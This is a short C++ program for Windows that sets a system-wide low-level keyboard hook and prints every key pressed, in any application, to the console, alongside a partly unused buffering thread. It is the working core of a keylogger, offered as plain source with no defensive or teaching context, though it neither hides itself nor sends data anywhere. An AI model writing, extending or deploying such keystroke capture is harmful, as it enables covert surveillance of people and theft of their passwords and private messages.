#include <iostream>
#include <Windows.h>
#include <thread>
#include <mutex>
#include <queue>
std::mutex buffer_lock;

std::queue<DWORD> buffer_queue;
std::vector<DWORD> thread_buffer;
bool time_to_stop = false;

void buffer_get_from_queue()
{
	std::lock_guard<std::mutex> guard(buffer_lock);
	while (!buffer_queue.empty())
	{
		thread_buffer.push_back(buffer_queue.front());
		buffer_queue.pop();
	}
}

void buffer_log_to_screen()
{

	thread_buffer.clear();
}

void buffer_clear_Method()
{
	while (!time_to_stop) {
		Sleep(1000);
		buffer_get_from_queue();
		buffer_log_to_screen();
	};
}


LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
	if (wParam == WM_KEYDOWN) 
	{
		std::lock_guard<std::mutex> guard(buffer_lock);
		std::cout << char(tolower(p->vkCode));
	}
	return CallNextHookEx(NULL,nCode, wParam, lParam);
}

int main()
{
	thread_buffer.reserve(1000);
	HHOOK hook=SetWindowsHookEx(
	WH_KEYBOARD_LL,
	keyboardHookProc,
	NULL,
	0
	);

/*	MessageBox(NULL, TEXT("PRESS OK to stop logging."), TEXT("Information"), MB_OK); */
	/*
	while (true)
	{

	}
	*/
	
	if (hook == NULL) {
		return 1;
	}

	std::thread worker_thread(buffer_clear_Method);
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
		/*if (Msg.wParam == WM_KEYDOWN) {
			break;
		}
		*/
	}
	worker_thread.join();
	return 0;
}
